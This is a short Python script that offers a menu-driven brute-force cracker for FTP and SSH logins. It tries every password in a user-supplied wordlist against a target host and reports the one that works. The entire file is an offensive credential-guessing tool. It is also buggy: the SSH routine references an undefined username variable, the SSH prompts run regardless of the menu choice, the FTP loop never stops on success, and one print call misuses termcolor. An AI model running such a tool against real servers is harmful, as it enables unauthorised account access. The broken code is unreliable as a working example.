import ftplib
import paramiko, sys, os, socket, termcolor
#ftp cracker
lis = ["1. FTP port", "2. SSH port"] 

for lis in lis:
    print(lis)

inp = input("option: ")

if inp == "1":
  server = input("FTP server: ")
  user = input("username: ")
  passlist = input("path os passwordlist: ")
  
  try:
      with open(passlist, 'r') as pw:
          for word in pw:
              word = word.strip('\r').strip('\n')
              try:
                  ftp = ftplib.FTP(server)
                  ftp.login(user, word)
                  print("success! the passsword is" + word)
              except:
                  print("still trying", word)
  except:
      print("wordlist error")

#SSH cracker
if inp == "2":
    def ssh_connect(password, code=0):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

        try:
            ssh.connect(host, port = 22, username = user, password = password)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error:
            code = 2

        ssh.close()
        return code 

host = input("Target Address: ")
username = input("SSH username: ")
passlist = input("path of password file: ")
print("\n")

if os.path.exists(passlist) == False:
    print("the path doesn't exists!")
    sys.exit(1)

with open(passlist, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored("[+]Found password: " + password, "For account: " + username,))
                break
            elif response == 1:
                print("[-] Incorrect login:" + password)
            elif response == 2:
                print("can not connect")
                sys.exit(1)
        except Exception as e:
            print(e)
            pass